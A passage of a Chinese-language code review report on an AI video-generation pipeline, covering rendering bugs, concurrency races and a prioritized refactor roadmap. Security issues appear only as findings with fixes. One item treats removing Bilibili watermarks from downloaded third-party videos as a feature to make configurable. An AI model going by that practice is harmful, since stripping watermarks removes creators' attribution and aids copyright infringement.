* **潜在风险**：`autoSearchBilibili()` 搜出来就用的旧 `streamUrl`（第 1096-1102 行获取，1132 行存进 DB），从搜索到下载中间如果隔了其他场景的并发处理（`concurrency=4`），**URL 可能已经过期**。首次搜索-下载链路没有刷新机制。

#### 36. maxDuration 判断会让整集素材被错误接受 🟠
* **相关代码**：[`pipeline.ts`](file:///f:/创作/20260512/ai-video-studio/src/lib/render/pipeline.ts)
  ```typescript
  const maxDuration = effectiveSources.length > 0 ? 1800 : 600;  // 30分钟 or 10分钟
  if (durSec < 5 || durSec > maxDuration) continue;
  ```
* **潜在风险**：允许单条素材长达 30 分钟，但下载时只取 `videoDuration * 0.15` 的片段。问题在于**把一整集电视剧当"素材"存进 DB**，`Material.duration` 字段记的是整集时长，`matchScore`/`thumbnail` 都是基于整集的，**元数据语义错乱**。

#### 37. 负面关键词过滤对"知识科普"内容误伤严重 🟠
* **相关代码**：[`pipeline.ts:1044-1072`](file:///f:/创作/20260512/ai-video-studio/src/lib/render/pipeline.ts#L1044-L1072) `negativeKeywords` 包含"讲解"、"教学"、"知识点"、"教程"等
* **潜在风险**：项目本身就是知识科普类（`ContentStyle.KNOWLEDGE`）——大量优质纪录片标题里就带"讲解""解读"。**过滤策略和内容定位直接冲突**。

#### 38. autoSearchBilibili 520 行上帝函数 🟠
* **相关代码**：[`pipeline.ts:695-1214`](file:///f:/创作/20260512/ai-video-studio/src/lib/render/pipeline.ts#L695-L1214)
* **潜在风险**：单函数 6 个 phase（0/1/1.5/2/2.5/2.8/3/4/5），无数个 `searchQueries.push`。**任何 phase 调整都要通读全函数**。这是整个代码库最危险的"上帝函数"。

#### 39. 去水印用固定坐标硬编码 🟡
* **相关代码**：[`pipeline.ts:1310-1314`](file:///f:/创作/20260512/ai-video-studio/src/lib/render/pipeline.ts#L1310-L1314)
  ```typescript
  { x: width*0.78, y: height*0.01, w: width*0.21, h: height*0.08 },
  { x: width*0.82, y: height*0.90, w: width*0.17, h: height*0.08 },
  ```
* **潜在风险**：B 站水印位置会随 App 版本/分辨率变化。比例系数是经验值，不同视频源（App 上传 vs 网页上传）水印位置不同。

### ④ 单场景合成

#### 40. 字幕和音频同步存在系统性偏差 🔴
* **相关代码**：[`src/lib/render/pipeline.ts`](file:///f:/创作/20260512/ai-video-studio/src/lib/render/pipeline.ts) — `estimateSpeechDuration` 中文字/3.5
* **潜在风险**：
  * TTS 实际语速因 voice 不同差异很大（云希偏快、云扬偏慢）。
  * 代码用 `audioDuration`（ffprobe 实测）做总时长归一化，但每个 chunk 内部的比例还是按字数估算的——**总时长对了，分段还是错**。
  * 结果：字幕会在某句话上提前消失或滞后出现，尤其最后一行经常被截断（`endTime` 被强制等于 `totalDuration`）。

#### 41. 素材时长 < 配音时长时，冻结最后一帧 🟠
* **相关代码**：[`pipeline.ts:1720`](file:///f:/创作/20260512/ai-video-studio/src/lib/render/pipeline.ts#L1720)
  ```typescript
  tpad=stop=-1:stop_mode=clone:stop_duration=${audioDurStr}
  ```
* **潜在风险**：素材 3 秒但配音 15 秒，会冻结最后一帧 12 秒——画面像卡死一样。**比黑屏还难看**。

#### 42. MG 动画字体硬编码 Windows 🟡
* **相关代码**：[`pipeline.ts:1413, 1620`](file:///f:/创作/20260512/ai-video-studio/src/lib/render/pipeline.ts#L1413-L1415)
* **潜在风险**：Docker/Linux 部署时 MG 场景直接渲染失败或字体缺失。应统一改用 `getDefaultFontPath()`。

### ⑤ 拼接 + 混音

#### 43. BGM 混音失败时静默丢弃，用户不知情 🔴
* **相关代码**：[`pipeline.ts:1807-1814`](file:///f:/创作/20260512/ai-video-studio/src/lib/render/pipeline.ts#L1807-L1814)
  ```typescript
  } catch {
    // Music mixing failed - just concat without music
    await execFileAsync([...]);  // 无音乐拼接
  }
  ```
* **潜在风险**：整个 BGM 混音在一个 try-catch 里，失败后**既不写日志也不更新数据库**，直接退化为无音乐版本。用户明确配了背景音乐，拿到成片没声音，**完全无法排查**。

#### 44. concat 用 -c copy 但前序场景编码参数不一致 🟠
* **相关代码**：[`pipeline.ts`](file:///f:/创作/20260512/ai-video-studio/src/lib/render/pipeline.ts) `execFileAsync(... "-c", "copy", ...)`
* **潜在风险**：每个场景独立 `-preset veryfast -crf 23` 编码，拼接时 `-c copy`。如果某个场景因为 fallback 用了不同分辨率/fps（MG 动画 `r=25`，实拍 `r=30`），`-c copy` 会拼接失败或时间轴错乱。`config.fps` 是 30，但 fallback 生成的 MG 片段写的是 `r=25`。

### ⑥ 跨环节

#### 45. 整条流水线没有任何"素材匹配失败率"反馈 🔴
* **具体表现**：代码里有大量 `console.warn`（场景 i 找不到素材、降级 MG、降级黑屏），但这些信息只进 stdout 日志，**不进数据库，前端看不到**。
* **潜在风险**：用户花几分钟渲染完，拿到一个 80% 是黑屏/MG 的视频，毫无预警。`RenderJob` 表设计了 `errorMessage` 字段，但只在最终失败时写，**中间环节的降级信息全丢**。

#### 46. 临时目录用 tmpdir() + render-${projectId}，并发渲染会冲突 🟠
* **相关代码**：[`pipeline.ts`](file:///f:/创作/20260512/ai-video-studio/src/lib/render/pipeline.ts)
  ```typescript
  const workDir = join(tmpdir(), `render-${projectId}`);
  ```
* **潜在风险**：同一项目被重复触发渲染（用户点两次按钮，或 FAILED 后重试），**两个进程写同一个目录，互相覆盖中间文件**。`scene-0.mp4` 这种固定文件名是典型竞态。应使用 `randomUUID()` 命名。

#### 47. 错误恢复不彻底，FAILED 状态污染 🟠
* **相关代码**：`tts/route.ts`、`storyboard/generate`、`quick-generate` 失败都把项目置 `FAILED`，但 `render/route.ts:40` 只在 `status==="FAILED"` 时重置为 `STORYBOARD_READY`。
* **潜在风险**：如果失败发生在 `STORYBOARD_GENERATING` 阶段，项目卡在中间态无法恢复。**没有事务回滚**：分镜生成失败可能残留半截 `Storyboard/Scene` 记录。

---

## 九、 几个值得注意的设计亮点 ✅

虽然问题多，但项目里有几个设计值得保留：

1. **AI Provider 自动 fallback** ([`src/lib/ai/router.ts`](file:///f:/创作/20260512/ai-video-studio/src/lib/ai/router.ts))：用户没配 key 时按 `ANTHROPIC → MIMO → OPENAI` 自动降级，MiMo 用 `api-key` header 而非 Bearer，处理得当。
2. **素材多优先级搜索词构建**（[`pipeline.ts`](file:///f:/创作/20260512/ai-video-studio/src/lib/render/pipeline.ts) `autoSearchBilibili`）：必须来源 → 推荐来源 → 画面词 → 专名 → 时代背景，多级 fallback 链 B站→Pexels→MG 动画，思路成熟。
3. **subtitle.ts 时长估算**（[问题 31](#31-tts-路由里的时长计算是错的3-套系数不一致)）：中文字/3.5 + 非中文/5 的混合系数比单一 `/3.5` 或 `/4` 准确得多，应统一替换。

---

## 十、 重构路线图 (Roadmap)

### 🔒 P0 紧急（1-2 天可做，安全 / 止血）

| # | 任务 | 关联问题 |
| :--- | :--- | :--- |
| 1 | **修复 TTS 命令注入**：将 `generateTTS` 改用 `child_process.spawn` 数组传参，彻底杜绝字符串拼接。 | 问题 7 |
| 2 | **TTS 失败显式化**：失败时写 `RenderJob.errorMessage` + 给 `Scene` 加 `renderWarning` 字段；不再静默静音兜底。 | 问题 32 / 45 |
| 3 | **统一时长估算**：TTS 路由 / quick-generate 全部替换为 `estimateAudioDuration()`，删除 `/4`、`/3.5` 的散落写法。 | 问题 31 |
| 4 | **删除 docker-compose 凭据**：改为 `${REDIS_PASSWORD}` 占位符，通过 `.env` 注入；强制加入 `.gitignore`。 | 问题 9 |
| 5 | **API Key 加密存储**：`crypto.createCipheriv('aes-256-gcm', KEY, IV)` 加密 `aiApiKey` 字段；前端永远不接收明文。 | 问题 8 |
| 6 | **修补 App 镜像系统依赖**：`docker/Dockerfile` runner 阶段增加 `apk add ffmpeg python3 py3-pip`。 | 问题 22 |
| 7 | **修复认证绕过**：删除 `DEFAULT_USER` 兜底；恢复 `requireSession` 401；启用 `middleware.ts` 的 `matcher`。 | 问题 12 |
| 8 | **修复 render 状态竞态**：用 `update where status not in ('RENDERING')` 条件更新 + 事务包裹。 | 问题 13 |
| 9 | **临时目录去重名竞态**：用 `randomUUID()` 命名 + `try/finally` 清理。 | 问题 46 |
| 10 | **uploads/ 加入 .gitignore** | 问题 23 |
| 11 | **删除 quick-generate 与 storyboard/generate 的 provider 写死** | 问题 28 |

### ⚠️ P1 重要（3-5 天，架构 / 质量）

| # | 任务 | 关联问题 |
| :--- | :--- | :--- |
| 12 | **统一渲染路径**：将 4 个渲染实现合并为 `RenderEngine` + `StorageProvider` + `SchedulerProvider` 策略接口。 | 问题 2 / 3 |
| 13 | **异步任务提交 + 进度推送**：`POST /render` 立即返回 `jobId`，前端 SSE 订阅；后端 BullMQ。 | 问题 1 |
| 14 | **SQLite WAL + busy_timeout**：`PRAGMA journal_mode=WAL; PRAGMA busy_timeout=5000;` | 问题 5 |
| 15 | **safeExec 工具**：timeout 触发时根据 `process.platform` 选择 `SIGKILL` 或 `taskkill /F /T /PID`。 | 问题 6 |
| 16 | **流式下载工具**：`pipeline(res.body, createWriteStream(dest))` 替代 `arrayBuffer()`。 | 问题 10 |
| 17 | **API 限流中间件**：基于 `rate-limiter-flexible` 实现 IP + 用户双维度；AI 调用每用户每天 100 次。 | 问题 18 |
| 18 | **临时目录统一清理**：项目级 workdir 注册表 + 启动时清扫 + `try/finally`。 | 问题 11 |
| 19 | **状态机集中管理**：用 `xstate` 或自定义 `transitions` 字典统一管理 9 个状态。 | 问题 14 |
| 20 | **请求体大小统一限制**：上传路由独立校验 `Content-Length`。 | 问题 19 |
| 21 | **删除 B 站搜索内联实现**：删除 `pipeline.ts:917-948`，统一用 `lib/materials/bilibili.ts`。 | 问题 34 |
| 22 | **B 站 stream URL 主动刷新**：`autoSearchBilibili` 搜索后立刻调 `getBilibiliVideoStream(bvid)` 拿最新 URL。 | 问题 35 |
| 23 | **整集素材拒绝**：maxDuration 上限从 1800s 降至 300s（或按 effectiveSources 数量动态计算）。 | 问题 36 |
| 24 | **negativeKeywords 按 ContentStyle 区分**：科普类剔除"讲解/解读/教学"等误伤词。 | 问题 37 |
| 25 | **autoSearchBilibili 拆分为 phase 函数**：每个 phase 单独成函数，主函数只做编排。 | 问题 38 |
| 26 | **字幕同步改用"实测 TTS 整段时长 + 按字数比例"** | 问题 40 |
| 27 | **素材 < 配音时用 Ken Burns 缩放/淡入淡出** 替代 `tpad=clone`。 | 问题 41 |
| 28 | **MG 字体改用 `getDefaultFontPath()`** | 问题 42 |
| 29 | **BGM 失败时写 RenderJob warning + 通知前端** | 问题 43 |
| 30 | **concat 前统一转码参数**：所有场景用相同的 fps / 像素格式 / SAR，避免 `-c copy` 失败。 | 问题 44 |

### 📝 P2 优化（持续，可维护性 / 可观测性）

| # | 任务 | 关联问题 |
| :--- | :--- | :--- |
| 31 | **健康检查 + 结构化日志**：`/api/health`、接入 `pino`、Prometheus metrics。 | 问题 25 |
| 32 | **消除双重轮询**：移除 React Query 的 `refetchInterval`，只保留 SSE 推送。 | 问题 17 |
| 33 | **AI 缓存表正式化**：Prisma migration 添加 `AICache` 模型 + 定时清理 cron。 | 问题 21 |
| 34 | **`productionMeta` Zod schema 化**：集中校验 / 解析 / 类型推断。 | 问题 20 |
| 35 | **Standalone 原生模块兼容**：文档化 `prisma generate` 必须在构建机执行；修 `serverExternalPackages` 路径。 | 问题 24 |
| 36 | **去水印坐标改为可配置**：从 `pipeline.ts` 抽出常量到 `config/materials.ts`。 | 问题 39 |
| 37 | **failed 状态恢复兜底**：从任何中间状态失败都能回到 DRAFT。 | 问题 16 / 47 |
| 38 | **pipeline.ts 拆分**：拆为 `tts.ts` / `materials.ts` / `compose.ts` / `mix.ts` 四个 stage 模块。 | 问题 3 |
| 39 | **ServerAction 100mb 限制移除或说明** | 问题 19 |

### 🟡 P3 战略

| # | 任务 | 关联问题 |
| :--- | :--- | :--- |
| 40 | **取消接口**：`POST /api/projects/[id]/render/cancel`，渲染前/中检查 `isCancelled` 标志。 | 问题 15 |
| 41 | **多租户隔离**：将 `DEFAULT_USER` 替换为 Clerk/Auth0。 | 问题 12 |
| 42 | **Postgres 迁移路径**：抽象 `prisma` 调用为 `repositories/`，未来切到 Postgres。 | 问题 5 |
| 43 | **WebSocket 替代 SSE**：高交互场景换 `ws` 双向通信。 | 问题 17 |
| 44 | **quick-generate 与 storyboard/generate 合并**：统一 prompt / 字段映射。 | 问题 27 |
| 45 | **场景数估算改为可配置**：UI 暴露"每场景字数"调节。 | 问题 30 |
| 46 | **TTS 提供商健康监控**：增加 MiMo API 配额查询、edge_tts 环境检测脚本。 | 问题 32 / 33 |

---

## 附录：影响面统计

| 严重等级 | 问题数 | 范围 |
| :--- | :---: | :--- |
| 🔒 P0 (安全 / 致命) | 11 | TTS 注入、TTS 静默、时长系数、Compose 凭据、API Key 明文、Dockerfile 缺依赖、认证绕过、状态竞态、目录竞态、uploads 未忽略、provider 写死 |
| ⚠️ P1 (架构 / 质量) | 19 | 同步渲染、双轨分裂、上帝文件、SQLite 阻塞、子进程泄露、流式 IO、限流、状态机分散、B站搜索重复、stream URL 半解、整集素材、负面词误伤、上帝函数、字幕偏差、静帧拖时间、MG 字体、BGM 静默、concat 不一致、临时目录未清理 |
| 📝 P2 (可维护) | 12 | 双重轮询、JSON 无 schema、SQL 缓存无迁移、Standalone 原生模块、无监控、quick-generate 双实现、场景数偏密、去水印硬编码、状态恢复不全、JSON parse 静默、双轨不一致、pipeline 单文件 |
| 🟡 P3 (体验) | 4 | 字体硬编码、状态机 PRODUCING/EDITING 无用、无取消、平台适配 |
| **合计** | **46** | — |

> **建议：先 P0（1-2 周），再 P1 架构重构（4-6 周），P2/P3 长期持续改进。**
